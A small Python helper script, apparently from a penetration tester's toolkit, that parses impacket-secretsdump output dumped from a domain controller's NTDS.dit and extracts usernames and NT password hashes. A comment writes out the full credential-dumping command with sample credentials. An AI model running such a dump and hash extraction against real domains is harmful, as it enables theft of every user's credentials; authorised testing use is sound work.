#!/usr/share/python3
# This script parses the output of dumping the DC's NTDS.dit file with:
#    - impacket-secretsdump DOMAIN.local/testuser:"Password1@"@192.168.0.19 -just-dc-ntlm
# -o specifies the output file; input file is positional

import sys
import argparse

def handleArguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-o', '--output')
    parser.add_argument('-i', '--input')
    args = parser.parse_args()
    return args

def parse(theFile, outFile):
    hashes = []
    users = []
    with open(theFile, 'r') as f:
        dataInit = f.read()
        data = dataInit.split('\n')
        for line in data:
            if ':' in line and not '[*]' in line:
                ntHash = line.split(':')[3]
                user = line.split(':')[0]
                hashes.append(ntHash)
                users.append(user)
    with open(outFile, 'w') as f:
        output = '\n'.join(hashes)
        f.write(output)
    for i in range(0, len(users)):
        print(f"{users[i]} : {hashes[i]}")

if __name__ == "__main__":
    args = handleArguments()
    parse(args.input, args.output)

